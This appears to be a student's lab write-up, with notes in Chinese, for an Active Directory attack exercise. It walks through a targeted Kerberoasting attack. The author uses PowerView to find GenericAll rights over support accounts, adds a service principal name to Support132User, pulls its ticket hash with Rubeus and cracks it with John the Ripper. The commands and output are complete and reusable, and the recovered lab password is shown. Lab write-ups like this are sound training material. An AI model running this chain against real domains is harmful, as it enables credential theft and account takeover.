Task
•  Determine if studentuserx has permissions to set UserAccountControl flags for any user.
•  If yes, force set a SPN on the user and obtain a TGS for the user.


# Determine if studentuserx has permissions to set UserAccountControl flags for any user.

枚举当前用户对StudentUsers组有什么ACL权限

```
PS C:\ad\Tools> . .\PowerView.ps1
PS C:\ad\Tools> Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match "StudentUsers"}
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a
distinguishedname with Convert-ADName
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a
distinguishedname with Convert-ADName
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a
distinguishedname with Convert-ADName


ObjectDN                : CN=Support131User,CN=Users,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1116
IdentityReferenceName   : studentusers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=StudentUsers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=Support132User,CN=Users,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1116
IdentityReferenceName   : studentusers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=StudentUsers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=Support133User,CN=Users,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1116
IdentityReferenceName   : studentusers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=StudentUsers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

<skip>
```

对SupportxUser有GenericAll权限，这里选择Support132User



#  If yes, force set a SPN on the user and obtain a TGS for the user.

使用ActiveDirectory module查看是否有Support132User的spn

```
PS C:\ad\Tools> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\ad\Tools> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS C:\ad\Tools> Get-ADUser -Identity Support132User -Properties ServicePrincipalName | select ServicePrincipalName

ServicePrincipalName
--------------------
{}


```

因为我们对这个用户有GenericAll权限，可以对它设置一个spn

```
PS C:\ad\Tools> Set-ADUser -Identity Support132User -ServicePrincipalNames @{Add='us/myspn132'} -Verbose
VERBOSE: Performing the operation "Set" on target "CN=Support132User,CN=Users,DC=us,DC=techcorp,DC=local".

```

或者使用pv
```
Set-DomainObject -Identity Support132User -Set @{serviceprincipalname='us/myspn132'} -Verbose
```

再次查看
```
PS C:\ad\Tools> Get-ADUser -Identity Support132User -Properties ServicePrincipalName | select ServicePrincipalName

ServicePrincipalName
--------------------
{us/myspn132}

```


Kerberoast 这个spn

```
C:\AD\Tools\Rubeus.exe kerberoast /user:Support132User /simple /rc4opsec /outfile:C:\AD\Tools\targetedhashes.txt
```

破解上面导出的哈希
```
PS C:\ad\Tools> C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Desk@123         (?)
1g 0:00:00:00 DONE (2022-10-31 18:03) 32.25g/s 24774p/s 24774c/s 24774C/s password..9999
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```